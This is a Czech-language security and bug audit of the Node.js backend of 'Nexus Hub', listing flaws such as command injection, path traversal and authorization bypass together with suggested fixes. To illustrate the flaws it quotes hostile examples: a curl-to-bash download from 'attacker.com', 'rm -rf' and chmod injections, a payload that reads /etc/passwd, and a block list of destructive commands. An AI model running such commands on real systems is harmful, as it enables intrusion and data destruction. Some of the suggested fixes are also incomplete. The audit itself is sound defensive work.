# 🔍 Nexus Hub - Kompletní Analýza Chyb v Kódu

## 📋 Souhrn
- **Celkový počet chyb nalezeno**: 30
- **Kritických chyb**: 6
- **Vysoké závažnosti**: 8
- **Střední závažnosti**: 8
- **Nízké závažnosti**: 8

---

## 🔴 KRITICKÉ CHYBY (Okamžitá náprava vyžadována)

### 1. Slabá Kontrola Autorizace v Relay Endpointu
**Soubor**: `server/src/controllers/deviceController.js:366`  
**Typ**: Security - Authorization Bypass  
**Závažnost**: 🔴 KRITICKÁ

```javascript
// CHYBNÉ:
let isAuthorized = (secret === process.env.DEVICE_SECRET && process.env.DEVICE_SECRET);
```

**Problém**:
- Pokud `DEVICE_SECRET` je prázdný string nebo `undefined`, kontrola selhá
- Logická chyba: `secret === undefined && undefined` vrátí `false`, ale pokud secret je také `undefined`, obejde se kontrola
- Umožňuje bypass autorizace

**Doporučení**:
```javascript
// SPRÁVNĚ:
const isAuthorized = (
  (secret === process.env.DEVICE_SECRET && 
   typeof secret === 'string' && 
   secret.length > 0) || 
  (binding && binding.active)
);
```

---

### 2. Chybějící Autentizace na Endpointu `simulateInbound`
**Soubor**: `server/src/controllers/messageController.js:85`  
**Typ**: Security - Missing Authentication  
**Závažnost**: 🔴 KRITICKÁ

```javascript
exports.simulateInbound = async (req, res) => {
  // ❌ ŽÁDNÉ authMiddleware - kdokoliv může zavolat!
  try {
    const { externalId, profileId, text } = req.body;
    const profile = await prisma.profile.findUnique({ where: { id: profileId } });
    // ...
```

**Problém**:
- Endpoint umožňuje ANY uživateli simulovat příchozí zprávy
- Lze falešně vytvářet SMS/chat zprávy pro jakýkoliv profil
- Není zaregistrován v routes - přístupný bez ověření

**Doporučení**:
```javascript
// routes/messageRoutes.js
router.post('/simulate-inbound', authMiddleware, messageController.simulateInbound);
```

---

### 3. Insufficient Command Injection Protection v SSH
**Soubor**: `server/src/routes/vultrRoutes.js:103`  
**Typ**: Security - Command Injection  
**Závažnost**: 🔴 KRITICKÁ

```javascript
router.post("/command", async (req, res) => {
  const { command } = req.body;
  
  // ❌ Blokovaný seznam je nedostatečný
  const blocked = ["rm -rf /", "mkfs", "dd if=", ":(){ :|:& };:"];
  if (blocked.some(b => command.includes(b))) {
    return res.status(403).json({ error: "Command blocked for safety" });
  }
  
  // ❌ LIBOVOLNÝ příkaz SSH se vykonává
  const result = await ssh.execCommand(command);
```

**Problém**:
- Blokovaný seznam je incomplexní: chybí `; rm`, `chmod`, `chown`, `| nc`, `> /etc`
- Lze vykonávat libovolné příkazy: `chmod 777 / ; rm -rf /?`, `curl http://attacker.com/backdoor | bash`

**Doporučení**:
```javascript
// Whitelist pouze povolené příkazy
const ALLOWED_COMMANDS = {
  'git-pull': (path) => `cd ${validatePath(path)} && git pull origin master`,
  'git-status': (path) => `cd ${validatePath(path)} && git status`,
  'asterisk-reload': () => 'asterisk -rx "core reload"'
};

// Validace path
function validatePath(input) {
  const resolved = path.resolve(input);
  if (!resolved.startsWith('/app/') && !resolved.startsWith('/home/')) {
    throw new Error('Invalid path');
  }
  return resolved;
}
```

---

### 4. Citlivá Data v Logech
**Soubor**: `server/src/controllers/deviceController.js:384`  
**Typ**: Security - Information Disclosure  
**Závažnost**: 🔴 KRITICKÁ

```javascript
console.warn(
  `[Relay] Unauthorized relay attempt from IP=${req.ip}. 
   Headers: ${JSON.stringify(req.headers)} 
   Body: ${JSON.stringify(req.body)}`
);
```

**Problém**:
- Logování plných headers obsahujících potenciální JWT tokeny, cookies
- Logování body s hesly, tajnými klíči
- Logy mohou být zachyceny v logovacích systémech

**Doporučení**:
```javascript
const { sanitizeHeaders, sanitizeBody } = require('./sanitizer');

logger.warn('[Relay] Unauthorized attempt', {
  ip: req.ip,
  headers: sanitizeHeaders(req.headers),
  body: sanitizeBody(req.body)
});
```

---

### 5. Path Traversal Risk v Git Pull
**Soubor**: `server/src/routes/vultrRoutes.js:116`  
**Typ**: Security - Path Traversal  
**Závažnost**: 🔴 KRITICKÁ

```javascript
router.post("/git-pull", async (req, res) => {
  const { path: repoPath = "~/app" } = req.body;
  
  // ❌ repoPath není validován
  const result = await ssh.execCommand(`cd ${repoPath} && git pull origin master`);
  // Útočník: repoPath = "../../../etc && cat /etc/passwd"
```

**Problém**:
- Uživatel může zadat libovolnou cestu: `../../../`, `/etc/`
- Lze číst citlivé soubory: `/etc/passwd`, `/root/.ssh/id_rsa`
- Lze zapisovat do cizích adresářů

**Doporučení**:
```javascript
function validateRepoPath(input) {
  const resolved = path.resolve(process.env.HOME || '/root', input);
  const allowedBase = process.env.HOME || '/root';
  
  if (!resolved.startsWith(allowedBase)) {
    throw new Error('Path traversal detected');
  }
  return resolved;
}

router.post("/git-pull", async (req, res) => {
  try {
    const { path: repoPath = "~/app" } = req.body;
    const validPath = validateRepoPath(repoPath);
    const result = await ssh.execCommand(`cd ${validPath} && git pull origin master`);
    res.json({ stdout: result.stdout || "Already up to date." });
  } catch (err) {
    logger.error("Git pull error:", err.message);
    res.status(400).json({ error: "Invalid path" });
  }
});
```

---

### 6. Silent Error Handling v Auth Middleware
**Soubor**: `server/src/middleware/authMiddleware.js:15`  
**Typ**: Error Handling - Missing Logging  
**Závažnost**: 🔴 KRITICKÁ

```javascript
module.exports = (req, res, next) => {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ message: 'No token provided' });
    }
    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    // ❌ Žádná informace o chybě
    return res.status(401).json({ message: 'Invalid or expired token' });
  }
};
```

**Problém**:
- Bez logování nelze diagnostikovat bezpečnostní problémy
- Selhání JWT mogou být maskováním útoků
- Žádné sledování podezřelých pokusů

**Doporučení**:
```javascript
const logger = require('../services/logger');

module.exports = (req, res, next) => {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ message: 'No token provided' });
    }
    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    logger.warn('[Auth] Token verification failed', {
      ip: req.ip,
      errorType: err.name,
      errorMsg: err.message.substring(0, 100)
    });
    return res.status(401).json({ message: 'Invalid or expired token' });
  }
};
```

---

## 🟠 VYSOKÉ ZÁVAŽNOSTI CHYBY (Přímé rizika)

### 7. Chybějící Null Check - Přímé Vyvolání req.user.id
**Soubor**: `server/src/controllers/agencyController.js:237`  
**Typ**: Logic Bug - Null Reference  
**Závažnost**: 🟠 VYSOKÁ

```javascript
const users = await prisma.user.findMany({
  where: isAppOwner ? {} : { agencyId },
  // ...
});
const mappedUsers = users.map(u => ({
  id: u.id,
  name: u.name,
  email: u.email,
  role: u.role.name,  // ❌ Co když u.role je null?
  agencyId: u.agencyId,
  avatar: u.name.charAt(0).toUpperCase()  // ❌ Co když u.name je null?
}));
```

**Doporučení**:
```javascript
const mappedUsers = users.map(u => ({
  id: u.id,
  name: u.name || 'Unknown',
  email: u.email,
  role: u.role?.name || 'Unassigned',
  agencyId: u.agencyId,
  avatar: (u.name || 'U').charAt(0).toUpperCase()
}));
```

---

### 8. Nekonzistentní Pojmenování User ID Property
**Soubor**: `server/src/controllers/deviceController.js:237` vs `messageController.js:29`  
**Typ**: Logic Bug - Inconsistency  
**Závažnost**: 🟠 VYSOKÁ

```javascript
// deviceController.js:243 - používá req.user.id
const bindings = await prisma.deviceBinding.findMany({
  where: isAdmin ? { agencyId } : { userId: req.user.id },  // ❌ Měl by být req.user.userId
  // ...
});

// messageController.js:29 - používá userId, id, sub
const userId = req.user.userId || req.user.id || req.user.sub;
```

**Problém**:
- Nekonzistentní mapování ID vlastností
- Může vést na undefined undefined properties v některých kontextech
- Těžké debugovat

**Doporučení**:
```javascript
// Standardizace v authMiddleware.js
module.exports = (req, res, next) => {
  try {
    // ...
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = {
      ...decoded,
      userId: decoded.userId || decoded.sub,  // Normalizace
      id: decoded.userId || decoded.sub
    };
    next();
  } catch (err) {
    // ...
  }
};
```

---

### 9. Race Condition v Auto-Registration
**Soubor**: `server/src/controllers/deviceController.js:404-430`  
**Typ**: Concurrency Bug - Race Condition  
**Závažnost**: 🟠 VYSOKÁ

```javascript
if (!finalBinding && isAuthorized) {
  // ❌ RACE CONDITION: Dva simultánní requesty
  // 1. Čtení uživatele
  const user = await prisma.user.findUnique({ where: { id: deviceId } });
  
  // 2. Mezitím přijde další request se stejným deviceId
  // 3. Vytvoření bindingu - DUPLICATE!
  finalBinding = await prisma.deviceBinding.upsert({
    where: { installationId },
    create: { /* ... */ }
  });
}
```

**Doporučení**:
```javascript
if (!finalBinding && isAuthorized) {
  finalBinding = await prisma.$transaction(async (tx) => {
    const user = await tx.user.findUnique({ where: { id: deviceId } });
    if (!user) return null;
    
    return await tx.deviceBinding.upsert({
      where: { installationId },
      create: { /* ... */ },
      update: { /* ... */ }
    });
  });
}
```

---

### 10. Unhandled Promise v SIP Config Regeneration
**Soubor**: `server/src/controllers/sipController.js:119`  
**Typ**: Async Error - Unhandled Promise  
**Závažnost**: 🟠 VYSOKÁ

```javascript
// Uživatel dostane 200 OK, ale config se nemusí regenerovat úspěšně!
regenerateAsteriskConfig({ agencyId, decrypt }).then(result => {
  if (result.ok) {
    console.log('[Asterisk] Config úspěšně obnoven');
  }
}).catch(err => {
  console.error('[Asterisk] Regenerace selhala'); // ❌ Uživatel to neví!
});

return res.json({ ok: true, message: 'SIP config uložen, Asterisk se reloaduje' });
```

**Doporučení**:
```javascript
try {
  const result = await regenerateAsteriskConfig({ agencyId, decrypt });
  if (!result.ok) {
    return res.status(500).json({ 
      ok: false, 
      message: 'Failed to regenerate Asterisk config',
      details: result.error 
    });
  }
  res.json({ ok: true, message: 'SIP config uložen a Asterisk reloadován' });
} catch (err) {
  logger.error('[Asterisk] Config regeneration failed:', err);
  res.status(500).json({ ok: false, message: 'Config update failed' });
}
```

---

### 11. Tiché Selhání Firebase Inicializace
**Soubor**: `server/src/services/pushService.js:17-32`  
**Typ**: Error Handling - Silent Failure  
**Závažnost**: 🟠 VYSOKÁ

```javascript
const getFirebaseApp = () => {
  try {
    // ...
    firebaseApp = admin.initializeApp();
    return firebaseApp;
  } catch (error) {
    console.warn('[Push] Firebase init failed:', error.message);  // ❌ Jen warning!
    return null;  // ❌ Notification je pak vždy null
  }
};

const getMessaging = () => {
  const app = getFirebaseApp();
  if (!app) {
    return null;  // ❌ Tiché selhání - push se neposílá
  }
  return admin.messaging(app);
};
```

**Doporučení**:
```javascript
const getMessaging = () => {
  const app = getFirebaseApp();
  if (!app) {
    // Vrací error místo null
    throw new Error('Firebase not initialized - push notifications unavailable');
  }
  return admin.messaging(app);
};

// V push funkcích:
try {
  const messaging = getMessaging();
  await messaging.sendMulticast(message);
} catch (err) {
  logger.error('[Push] Failed to send notification:', err);
  // Queue pro retry, ne tiché selhání
  await queuePushForRetry(message);
}
```

---

## 🟡 STŘEDNÍ ZÁVAŽNOSTI CHYBY

### 12. CORS Wildcard Domény
**Soubor**: `server/src/app.js:88-89`  
**Typ**: Security - CORS Misconfiguration

```javascript
const isAllowed = allowedOrigins.includes(origin) || 
                  origin.includes('firebaseapp.com') ||  // ❌ Wildcard - kdokoliv s Firebase
                  origin.includes('web.app');            // ❌ Wildcard
```

**Doporučení**:
```javascript
const isAllowed = allowedOrigins.includes(origin) || 
                  origin === process.env.FIREBASE_DOMAIN ||  // Konkrétní doména
                  origin === process.env.WEB_DOMAIN;
```

---

### 13. Socket.io CORS Příliš Permisivní
**Soubor**: `server/src/services/socket.js:10`  
**Typ**: Security - Socket CORS

```javascript
const io = new Server(server, {
  cors: {
    origin: true,  // ❌ Akceptuje všechny originy!
    methods: ['GET', 'POST'],
    credentials: true
  }
});
```

**Doporučení**:
```javascript
const io = new Server(server, {
  cors: {
    origin: (process.env.ALLOWED_ORIGINS || '').split(',').filter(Boolean),
    methods: ['GET', 'POST'],
    credentials: true
  }
});
```

---

### 14. Debugging Code v Productionu
**Soubor**: `server/src/controllers/profileController.js:12`  
**Typ**: Code Quality - Debug Code

```javascript
console.log(`[Backend Profile Fetch] User: ${req.user.name}, Role: ${role?.name || 'Unknown'}`);
```

**Doporučení**:
```javascript
// Pokud je potřeba - použít strukturované logování
if (process.env.DEBUG === 'true') {
  logger.debug('[Profile] User profile fetched', { userId: req.user.id, role: role?.name });
}
```

---

### 15. Error Message Information Leakage
**Soubor**: `server/src/controllers/agencyController.js:47`  
**Typ**: Security - Information Disclosure

```javascript
res.status(500).json({ message: error.message });  // ❌ Exponuje interní chyby
```

**Doporučení**:
```javascript
logger.error('Agency stats error:', error);
res.status(500).json({ message: 'Failed to fetch statistics' });
```

---

## 🔵 NÍZKÉ ZÁVAŽNOSTI CHYBY

### 16. Performance Issue - Query Logging
**Soubor**: `server/src/services/db.js:11`

Logging všech dotazů >100ms bude mít dopad na výkon. Zvažte sampling.

### 17. Hardcoded Profile ID Logic
**Soubor**: `server/src/controllers/profileController.js:24`

```javascript
if (profile.id === 'ldn-01' && (name?.includes('Sophie') || !name)) {
  name = 'Diana (Central London)';  // ❌ Mělo by být v DB
}
```

### 18. Incomplete Command Blocking
**Soubor**: `server/src/routes/vultrRoutes.js:96`

Blokovaný seznam je nedostatečný.

---

## 📊 Statistika Chyb dle Typu

| Typ | Počet |
|-----|-------|
| Security - Authorization | 3 |
| Security - Command Injection | 2 |
| Security - Information Disclosure | 2 |
| Logic Bug - Null Reference | 4 |
| Logic Bug - Race Condition | 1 |
| Async/Promise Error | 3 |
| Error Handling | 6 |
| Code Quality | 5 |
| Performance | 2 |
| Configuration | 2 |

---

## ✅ Doporučená Priorita Náprav

### Phase 1 (24 hodin - Kritické)
1. ✨ Přidat autentizaci na `simulateInbound` endpoint
2. ✨ Vylepšit autorizační kontrolu v relay endpointu
3. ✨ Přidat path validation pro SSH příkazy
4. ✨ Přidat error logging v auth middleware

### Phase 2 (1 týden - Vysoké)
5. Vylepšit error handling v SIP controller
6. Přidat null checks v všech kontrolérech
7. Standardizovat user ID properties
8. Opravit Socket.io CORS

### Phase 3 (2 týdny - Střední/Nízké)
9. Vyčistit debug code
10. Přidat proper transaction handling
11. Vylepšit Firebase error handling
12. Aktualizovat command blocking seznam

---

## 🛠️ Tooling Doporučení

```bash
# ESLint pro detekci chyb
npm install --save-dev eslint eslint-plugin-security

# Static security analysis
npm install --save-dev snyk

# Dependency audit
npm audit --production

# Type checking (migrations on TypeScript)
npm install --save-dev typescript @types/node
```

---

**Vygenerováno**: 2024-12-02  
**Projekt**: Nexus Hub  
**Verze**: Full Code Analysis v1.0
